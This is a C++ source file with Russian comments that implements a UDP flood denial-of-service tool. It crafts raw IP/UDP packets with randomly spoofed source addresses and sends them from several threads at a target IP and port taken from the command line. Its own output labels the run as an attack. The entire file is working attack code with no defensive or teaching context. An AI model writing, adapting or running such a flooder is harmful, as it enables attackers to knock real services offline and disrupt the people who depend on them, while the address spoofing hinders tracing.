#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <thread>
#include <csignal>
#include <atomic>

std::atomic<bool> running(true);

void signal_handler(int signum) {
    running = false;
}

unsigned short checksum(void *addr, int len) {
    int sum = 0;
    unsigned short *buf = (unsigned short*)addr;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void send_udp(const char* target_ip, int target_port, int packet_size, int delay) {
    // Создание raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        return;
    }

    // Включение опции IP_HDRINCL
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return;
    }

    // Подготовка адреса назначения
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Буфер для пакета
    char *packet = new char[packet_size];
    memset(packet, 0, packet_size);

    // IP заголовок
    struct iphdr *ip = (struct iphdr*)packet;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->id = htons(getpid());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->daddr = dest_addr.sin_addr.s_addr;

    // UDP заголовок
    struct udphdr *udp = (struct udphdr*)(packet + sizeof(struct iphdr));
    udp->source = htons(rand() % 65535);
    udp->dest = htons(target_port);
    udp->len = htons(packet_size - sizeof(struct iphdr));
    
    // Генерация случайных данных
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    for (int i = 0; i < packet_size - sizeof(struct iphdr) - sizeof(struct udphdr); i++) {
        data[i] = rand() % 256;
    }

    // Расчет контрольной суммы UDP
    struct pseudohdr {
        uint32_t saddr;
        uint32_t daddr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t length;
    } psh;
    
    psh.saddr = ip->saddr;
    psh.daddr = ip->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_UDP;
    psh.length = htons(sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr)));
    
    char pseudo_packet[sizeof(psh) + sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr))];
    memcpy(pseudo_packet, &psh, sizeof(psh));
    memcpy(pseudo_packet + sizeof(psh), udp, ntohs(udp->len));
    udp->check = checksum(pseudo_packet, sizeof(pseudo_packet));

    // Основной цикл отправки
    while (running) {
        // Генерация случайных значений
        ip->saddr = rand();
        ip->id = htons(rand() % 65535);
        udp->source = htons(rand() % 65535);
        
        // Пересчет контрольной суммы IP
        ip->check = 0;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        // Пересчет контрольной суммы UDP
        psh.saddr = ip->saddr;
        memcpy(pseudo_packet, &psh, sizeof(psh));
        memcpy(pseudo_packet + sizeof(psh), udp, ntohs(udp->len));
        udp->check = 0;
        udp->check = checksum(pseudo_packet, sizeof(pseudo_packet));

        // Отправка пакета
        if (sendto(sock, packet, packet_size, 0, 
                  (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto");
        }
        
        // Задержка между пакетами
        if (delay > 0) {
            usleep(delay);
        }
    }
    
    delete[] packet;
    close(sock);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <THREADS> <PPS> [PACKET_SIZE]\n";
        return 1;
    }

    const char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int pps = atoi(argv[4]);
    int packet_size = (argc > 5) ? atoi(argv[5]) : 512;
    int delay = (pps > 0) ? 1000000 / pps : 0;

    // Проверка размера пакета
    if (packet_size < sizeof(struct iphdr) + sizeof(struct udphdr)) {
        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
    }
    if (packet_size > 65535) {
        packet_size = 65535;
    }

    std::cout << "[+] Starting UDP Flood on " << ip << ":" << port 
              << " with " << threads << " threads (" 
              << pps << " pps, " << packet_size << " bytes)\n";

    for (int i = 0; i < threads; i++) {
        std::thread(send_udp, ip, port, packet_size, delay).detach();
    }

    std::cout << "[!] Press Ctrl+C to stop...\n";
    while (running) {
        sleep(1);
    }

    std::cout << "\n[+] Attack stopped\n";
    return 0;
}